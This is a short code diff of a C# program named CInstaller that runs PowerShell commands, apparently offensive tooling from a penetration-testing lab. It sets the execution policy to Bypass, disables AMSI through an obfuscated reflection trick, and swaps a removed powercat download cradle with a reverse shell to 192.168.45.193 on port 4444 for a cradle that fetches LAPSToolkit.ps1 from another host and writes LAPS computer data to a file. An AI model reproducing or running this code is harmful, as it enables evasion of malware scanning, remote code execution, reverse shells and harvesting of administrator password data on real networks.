@@ -26,13 +26,14 @@ namespace CInstaller
             ps.Runspace = rs;
 
             // Set Execution Policy
-            ps.AddScript("Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass");
+            ps.AddScript("Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force");
 
             // Disable AMSI
             ps.AddScript("[Ref].Assembly.GetType('System.Management.Automation.Amsi'+[char]85+'tils').GetField('ams'+[char]105+'InitFailed','NonPublic,Static').SetValue($null,$true)");
 
-            // "Interactive" Shell
-            ps.AddScript("IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.193/powercat.ps1');powercat -c 192.168.45.193 -p 4444 -e powershell.exe");
+            // PowerShell download cradle to import LAPSToolkit.ps1 and execute 'Get-LAPSComputers' function
+            ps.AddScript("IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.153/LAPSToolkit.ps1')");
+            ps.AddScript("Get-LAPSComputers | Out-File .\\output.txt");;
 
             ps.Invoke();
             rs.Close();
